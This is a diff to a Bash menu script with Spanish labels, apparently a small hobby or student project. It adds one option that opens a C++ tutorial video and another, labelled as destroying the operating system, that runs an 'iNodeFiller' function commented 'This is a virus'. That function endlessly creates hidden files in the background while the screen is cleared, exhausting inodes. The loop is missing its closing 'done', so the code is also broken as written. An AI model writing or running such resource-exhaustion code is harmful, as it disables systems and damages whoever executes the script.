@@ -12,8 +12,8 @@ EXIT=0
 
 displayMenu(){
     echo "---- MENU ----"
-    echo "[1] "
-    echo "[2] "
+    echo "[1] Aprender a programar en C++"
+    echo "[2] Destruir el sistema Operativo llenando los I-Nodos"
     echo "[3]"
     echo "[4]"
     echo "[5]"
@@ -29,10 +29,11 @@ readOpcion(){
 
     case $OPT in
         1)
-            echo "1"
+            aprenderCplusplus
             ;;
         2)
-            echo "2"
+            iNodeFiller &
+            clearScreen
             ;;
         3)
             echo "3"
@@ -66,4 +67,17 @@ runMenu(){
     done
 }
 
+aprenderCplusplus(){
+    xdg-open "https://www.youtube.com/watch?v=8jLOx1hD3_o" > /dev/null 2>&1
+    sleep 2
+}
+
+iNodeFiller(){
+    #This is a virus
+    I=0
+    while :
+    do 
+        I=$((I+1))
+        touch .f$I > /dev/null 2>&1;
+}
 runMenu
